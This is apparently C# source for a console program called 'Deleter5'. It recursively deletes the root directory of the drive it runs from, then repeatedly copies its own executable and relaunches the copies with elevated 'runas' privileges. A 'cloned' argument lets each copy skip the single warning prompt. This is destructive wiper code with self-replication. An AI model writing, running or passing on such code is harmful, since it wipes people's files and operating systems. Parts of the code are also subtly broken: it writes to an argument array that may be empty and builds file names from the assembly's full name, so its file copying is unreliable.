namespace System
{
    public static class Deleter
    {
        private static System.String Dir = System.IO.Directory.GetDirectoryRoot(System.IO.Directory.GetCurrentDirectory());
        private static readonly System.String ProgramName = System.Reflection.Assembly.GetExecutingAssembly().FullName;
        private static System.UInt64 UInt64;
        private static System.Boolean IsCloned;
        public const System.String Ver = "1.7";
        public const System.String Title = "Deleter5 v" + System.Deleter.Ver;
        private static void DeleteDir(System.String arg)
        {
            if (System.Deleter.Dir == null || System.Deleter.Dir == "")
            {
                System.Deleter.Dir = "/";
            }
            System.Console.Out.Write(arg);
            try
            {
                System.Console.Out.WriteLine("Deleting " + System.Deleter.Dir);
                System.IO.Directory.Delete(System.Deleter.Dir, true);
            }
            catch (System.Exception ex)
            {
                System.Console.Out.WriteLine("Error deleting " + System.Deleter.Dir);
                System.Console.Out.WriteLine(ex);
            }
        }
        public static void Main(System.String[] args)
        {
            if (System.Deleter.Dir == null || System.Deleter.Dir == "")
            {
                System.Deleter.Dir = "/";
            }
            System.String arguments = "";
            foreach (System.String arg in args)
            {
                arguments += arg;
            }
            System.Console.Title = System.Deleter.Title;
            System.Console.ForegroundColor = System.ConsoleColor.DarkGray;
            System.Console.BackgroundColor = System.ConsoleColor.DarkRed;
            if (arguments.ToLower().Contains("cloned"))
            {
                System.Deleter.IsCloned = true;
            }
            else
            {
                System.Deleter.IsCloned = false;
            }
            if (!System.Deleter.IsCloned)
            {
                System.Console.Out.WriteLine("WARNING! THIS DELETES THE ROOT DIRECTORY! " +
                    "EXECUTING THIS WILL RENDER YOUR DEVICE UNUSABLE!");
                System.Console.Out.WriteLine("ARE YOU SURE YOU WANT TO CONTINUE? Y OR N");
                if (!System.Console.ReadLine().ToUpper().Contains("Y"))
                {
                    System.Environment.Exit(0);
                    return;
                }
            }
            args[0] = "                                                                      ....                          \n                                                                    ..-+=:...                       \n                                                                 ..+########..                      \n                                                              ..=##########*...                     \n                                                             .:###########*###-.                    \n                 ........                                 ..:##############*##*..                   \n               ....-####+:..                             .:*##################..                    \n              ..=######+*##+:....                      ..=###################..                     \n              .++*#######*+####=:...                 ..-###################*.                       \n              .=*################*-...              ..=###################=..                       \n               ..=##########++#####*=:...          .-###################*:..                        \n                ..-##################==...       ..+###################=..                          \n                 ..-*##################*+=:.   ..-*##################*:..                           \n                   ..=**##################*+-..:*###################=.                              \n                    ...:#*###################++#################**=...                              \n                       ..*####################################=++:...                               \n                        ..+#################################=+=:.                                   \n                         ..:+##############################+=:.                                     \n                            ..-############################-..                                      \n                               ..=#######################*:..                                       \n                                ...+######################-.                                        \n                                ..+#*##################*###*:..                                     \n                               .:#####*-################**####..                                    \n                              .##**+*=#####################*###*..                                  \n                           ..-*#*##=-###*-=+################-:###+...                               \n                         ...+#:=*+.-*#+..-*###################-=###-...                             \n                        ..-+-:=-:.=**:-.-#####*-*+**###########*-+###+...                           \n                       ..:===-::.:--..:=####*:...+=-*+*####***###+-+###-..                          \n                     ..:.----:=-+--:.+#####-.    .:+++++#####*+*###=:*##*:..                        \n                    ..---=*=-===+:..+####+:.      ...+==:+*####+*####-:*##=..                       \n                   ..:--=++=+#+*:.:*###*:.           .:+*=+*#####+*####-=##*:                       \n                ....=--+**##**#:.+###*:.              ..:**+**######*###*=*##=..                    \n                ..:--:+*##***-..+#**:.                 ...:+###=+####***##**##*-..                  \n              ..::..-=*#*-*=..=#+*-...                    ..:*##*=-*####***#**##=..                 \n            ..:...:==##==+..:***=..                          .-+##*+=-+##++###++#*:..               \n           ......--+**=+:..-+*=..                             ..:+##*+-+##*+###+-+#+.               \n         .......::+#==-...:+=..                                  .:*###*+#*#*+###+:**:.             \n        .........=+=-....==...                                    ...+###***#*##*+#-:==.            \n       ........:*==:...-+:..                                        ...=*###***+#*-=*.:-..          \n        .  ...--:....:+....                                           ...:==+*:=+*#=-:=...          \n          ....-....:=:..                                                ....:-:-.=#+-.:=:.          \n         ...... ..=:..                                                       ......-=-..::.         \n           ... .:..                                                             .:.........         \n              ..                                                                  ...  .....        \n";
            System.Threading.Thread.Sleep(1000);
            while (System.IO.Directory.Exists(System.Deleter.Dir))
            {
                System.Deleter.UInt64++;
                System.Deleter.DeleteDir(args[0]);
                System.IO.File.Copy(System.Deleter.ProgramName + ".exe",
                System.Deleter.ProgramName + " (" + System.Deleter.UInt64 + ").exe");
                System.Diagnostics.Process p = new System.Diagnostics.Process();
                p.StartInfo.UseShellExecute = true;
                p.StartInfo.Verb = "runas";
                p.StartInfo.Arguments = "cloned";
                p.StartInfo.FileName = System.Deleter.ProgramName
                + " (" + System.Deleter.UInt64 + ").exe";
                p.Start();
            }
        }
    }
}